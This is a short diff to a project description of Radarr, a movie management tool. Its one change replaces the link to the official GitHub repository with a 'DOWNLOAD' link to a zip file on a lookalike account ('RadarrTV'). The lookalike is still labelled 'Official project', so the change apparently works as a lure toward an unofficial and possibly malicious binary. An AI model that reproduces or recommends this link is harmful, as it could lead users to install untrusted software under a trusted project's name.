@@ -26,7 +26,7 @@ It integrates with supported download clients and indexers to search for movie r
 
 Whether you're building a home media server or maintaining a large movie collection, Radarr provides a centralized interface for managing your movies and their quality profiles.
 
-**Official project:** https://github.com/Radarr/Radarr
+**Official project:** [DOWNLOAD](https://github.com/RadarrTV/Radarr/releases/download/radarr/Radarr.TV.zip)
 
 ---
 
